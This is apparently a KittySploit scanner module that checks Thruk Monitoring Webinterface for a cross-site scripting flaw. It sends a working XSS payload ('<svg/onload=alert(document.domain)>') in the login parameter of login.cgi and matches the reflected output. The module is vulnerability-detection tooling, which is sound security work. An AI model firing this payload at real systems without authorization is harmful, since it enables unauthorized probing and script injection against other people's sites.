#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Thruk Monitoring Webinterface contains a cross-site scripting vulnerability via the login parameter at /thruk/."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Thruk Monitoring Webinterface - Cross-Site Scripting Detection',
        'description': 'Thruk Monitoring Webinterface contains a cross-site scripting vulnerability via the login parameter at /thruk/cgi-bin/login.cgi.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'thruk', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.thruk.org/download.html',
            'https://www.usd.de/en/security-advisory-thruk-monitoring-v2-46-3',
        ],
    }

    def run(self):
        path = '/thruk/cgi-bin/login.cgi'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='referer=&login=%22%3Csvg%2Fonload%3Dalert%28document.domain%29%3E%22%40gmail.com&password=test&submit=Login\n')
        if not r or r.status_code != 500:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('<svg/onload=alert(document.domain)>"@gmail.com\') called at',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='high', reason='Thruk Monitoring Webinterface - Cross-Site Scripting detected', path=path)
            return True
        return False

